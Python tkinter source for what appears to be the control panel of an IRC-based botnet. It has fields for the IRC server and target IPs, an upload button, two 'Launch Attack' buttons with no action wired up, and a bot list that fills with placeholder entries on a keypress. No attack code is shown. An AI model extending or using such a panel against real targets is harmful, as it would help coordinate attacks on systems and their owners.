import tkinter as tk
master_client = __import__('master-client')



window = tk.Tk()
window.botcounter = 0

frame_a = tk.Frame()

frame_b = tk.Frame(width=80)

frame_e = tk.Frame(master=window, width=400, height=100, bg="blue")
# frame_e.pack(fill=tk.BOTH, side=tk.TOP, expand=True)

frame_c = tk.Frame(master=window, width=400, height=400, bg="blue")
frame_c.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)


def connect():
    ip = IRCip.get()
    client = master_client.Client(ip, 8080, 'master')
    client.start()
    print(ip)

for i in range(2):

    frame_c.rowconfigure(i, weight=1, minsize=200)

    for j in range(3):
        frame_c.columnconfigure(j, weight=1, minsize=200)

        frame = tk.Frame(
            master=frame_c,
            relief=tk.RAISED,
            borderwidth=3
        )
        if i == 0:

            frame.grid(row=i, column=j)

            if j == 0:
                label = tk.Label(master=frame, relief=tk.RAISED, borderwidth=1, fg="blue", text="IRC Server IP")
                button = tk.Button(master=frame, text="Connect", command=connect)
                IRCip = tk.Entry(master=frame)
                label.pack()
                IRCip.pack()
                button.pack()
            elif j == 1:
                label = tk.Label(master=frame, relief=tk.RAISED, borderwidth=1, fg="blue", text="Target Server IP")
                Targetip= tk.Entry(master=frame)
                label.pack()
                Targetip.pack()
                button = tk.Button(master=frame, text="Upload")
                button.pack()
            elif j == 2:
                frame.config(bg="blue", borderwidth=0, highlightthickness=0)
                light = tk.Canvas(master=frame, bg="blue", highlightthickness=0, relief=tk.FLAT, width=30, height=30)
                coordinates = 2, 2, 29, 29
                circle = light.create_oval(coordinates, fill="green", width=2)
                #light.grid(row=i, column=j)
                label = tk.Label(master=frame, relief=tk.RAISED, borderwidth=1, fg="blue", text="IRC Connection Status")
                #label.grid(row=i, column=j)
                label.pack(side=tk.LEFT)
                light.pack(padx=2, side=tk.RIGHT)

        elif i == 1 and j < 2:
            frame.grid(row=i, column=j, padx=5, pady=5)
            button = tk.Button(master=frame, height=5, width=20, bg="red", text=f"Launch Attack {j + 1}")
            button.pack(padx=5, pady=5)
        elif j == 2:
            frame.grid(row=i, column=j)
            frame.config(highlightthickness=0, borderwidth=0, bg="blue")
            img = tk.PhotoImage(file="cpscArt.png")
            pic = tk.Canvas(master=frame, bg="blue", highlightthickness=0, relief=tk.FLAT, width=200, height=200)
            pic.pack()
            pic.create_image(30, 2, anchor=tk.NW, image=img)



scroll = tk.Scrollbar(master=frame_b)
scroll.pack(side=tk.RIGHT, fill=tk.Y)
canvas = tk.Canvas(master=frame_b,width=100)
bots = tk.Frame(master=canvas)
scroll.config(command=canvas.yview)

bots.bind(
    "<Configure>",
    lambda e: canvas.configure(
        scrollregion=canvas.bbox("all")
    ),
)
canvas.create_window((0,0), window=bots, anchor="nw")
canvas.pack(fill=tk.Y, expand=True)

def handle_keypress(event):
    window.botcounter += 1
    label1 = tk.Label(master=bots, relief=tk.RAISED, borderwidth=1, fg="green",
                      text=f"BOT {window.botcounter}\nIP: 111.1.111.111\nPort: 25565\nJoined: 00.00")
    label1.pack(padx=5, pady=5)






window.bind("<Key a>", handle_keypress)

label_a = tk.Label(master=frame_a, relief=tk.RAISED, borderwidth=5, text="Connected Bots")
label_a.pack(padx=5)

# frame_e.pack(fill=tk.BOTH, side=tk.TOP, expand=True)
frame_c.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)
frame_a.pack()
frame_b.pack(fill=tk.Y, expand=True)

window.mainloop()

